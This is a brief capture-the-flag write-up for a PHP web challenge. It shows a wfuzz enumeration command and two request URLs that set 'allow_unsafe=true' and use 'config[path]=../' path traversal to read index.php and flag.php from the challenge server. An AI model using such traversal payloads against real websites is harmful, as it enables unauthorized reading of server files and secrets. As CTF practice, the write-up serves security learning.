Given a website along with a src folder

As preliminary check, try to fuzz, but it gives status 200 even if its not found, so let's skip it.
```
wfuzz -c --hc 404 -w /usr/share/wordlists/wfuzz/general/common.txt -w /usr/share/wordlists/wfuzz/general/extensions_common.txt https://web-philtered-0a2005e5b9bf.2025.ductf.net/FUZZFUZ2Z
```

Looking at the source, I figured that I need to access the php variable `flag`. But how? It's located in flag.php

This was done by my teammate, but I was on the right track. `allow_unsafe=true` disables the sanitizing, while config[path] access the file
```
https://web-philtered-0a2005e5b9bf.2025.ductf.net/index.php?allow_unsafe=true&config[path]=../index.php

https://web-philtered-0a2005e5b9bf.2025.ductf.net/index.php?allow_unsafe=true&config[path]=..%2Fflag.php
```